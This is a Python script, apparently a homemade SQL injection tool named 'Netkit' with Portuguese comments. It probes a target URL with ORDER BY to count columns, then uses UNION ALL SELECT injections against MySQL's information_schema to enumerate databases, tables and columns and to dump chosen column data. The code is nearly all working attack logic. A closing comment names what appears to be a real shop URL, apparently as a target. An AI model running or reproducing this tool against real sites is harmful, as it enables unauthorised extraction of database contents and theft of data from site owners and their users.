#!/bin/python3

import requests
from subprocess import check_output as out, call
from sys import argv, exit
from time import sleep
from time import time

ini = time()
print()
#se for usar --columns ou um outro paramêtro que pode exigir mais de um argumento, vai poder separar de varias formas com ","
argv = " ".join(argv)
argv = argv.replace(" ,", ",").replace(", ", ",")
argv = argv.split()

#função que puxa as infos
def sqli(pull_type: str, diretory: str, extra: str="", column=False):
    infos = ['']
    new = []
    for i in range(n):
        algr = []
        for j in range(n):
            if column: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{i}x'))")
            else: algr.append(f"CONCAT(UPPER('x{i}tikten0x'), {pull_type}, UPPER('x0tikten{i}x'))")
        algr = ",".join(algr)
        for j in infos:
            if j.split() != [] and column: new.append(f"{pull_type} != '{j.split()[0]}'")
            else: new.append(f"{pull_type} != '{j}'")
        new = " AND ".join(new)
        r = requests.get(f"{argv[1]} union all select {algr} from {diretory} where {new} {extra} --")
        r = r.text
        try:
            co = r.index(f"X{i}TIKTEN0X")+len(f"X{i}TIKTEN0X")
            fi = r.index(f"X0TIKTEN{i}X")
        except:
            break
        infos.append(r[co:fi])
        new = []
    infos = "\n".join(set(infos))
    if infos.replace(" ", "") == "":
        infos = "\n<empty>"
    return infos

#função que conta as colunas
def pull_columns():
    global n
    print("\033[01;32m[+]\033[0;0m\033[01;39mStarting\033[0;0m")
    print("\033[01;32m[+]\033[0;0m\033[01;39mTesting Connection\033[0;0m")

    try:
        r = requests.get(argv[1])
    except requests.exceptions.ConnectionError:
        print("\033[01;91m[+]\033[0;0m\033[01;39mConnection not ok\033[0;0m")
        exit()
    except requests.exceptions.MissingSchema:
        print("\033[01;91m[+]\033[0;0m\033[01;39mInvalid url\033[0;0m")
        exit()

    print("\033[01;32m[+]\033[0;0m\033[01;39mConnection ok\033[0;0m")
    r = ""
    n = 1
    while not "warning: mysql" in r.lower() and not "unknown column" in r.lower():
        try:
            r = requests.get(f"{argv[1]} order by {n} --").text
            # tirar mod_security
            #generated by Mod_Security
        except KeyboardInterrupt:
            exit()
        except:
            None
        sleep(0.01)
        n += 1
    n -= 2
    print(f"\033[01;32m[+]\033[0;0m\033[01;39m{n} columns\033[0;0m")

#função para pegar os parâmetros 
def pullt(require, info):
    if not info in argv:
        print(f"Netkit: {require} requires {info}.")
        exit()
    try:
        typ = argv.index(info)+1
        typ = argv[typ]
    except:
        print("Netkit: missing arguments. Type -h to see the list of commands. ")
        exit()

    if "--dbs" in argv:
        print("Netkit: Args invalids")
        exit()
    return typ

if "--tables" in argv:
    if "--columns" in argv:
        print("Netkit: Args invalids")
        exit()
    db = pullt("--tables", "-D")
    if db == "--tables":
        print("Netkit: -D requires name of database.")
        exit()
    pull_columns()
    res = sqli("table_name", "information_schema.tables", f"and table_schema = '{db}'")
    print(res)

elif "--columns" in argv:
    if "--tables" in argv:
        print("Netkit: Args invalids")
        exit()
    db = pullt("--columns", "-D")
    table = pullt("--columns", "-T")
    pull_columns()
    res = sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'", column=True)
    print(res)

elif "-C" in argv:
    if "--tables" and "--columns" in argv:
        print("Netkit: Args invalids")
        exit()
    db = pullt("-C", "-D")
    table = pullt("-C", "-T")
    columns = pullt("-C", "-C")
    pull_columns()
    for i in columns.split(","):
        res = sqli(i, f"{db}.{table}")
        print(res)

elif "--dbs" in argv:
    pull_columns()
    res = sqli("table_schema", "information_schema.tables")
    print(res)
ini = time() - ini
print(f"\nTime: {ini}")

#http://adessocasa.com.br/site/1.5/pag_produtos_loja.php?id=18&&idfornecedor=1
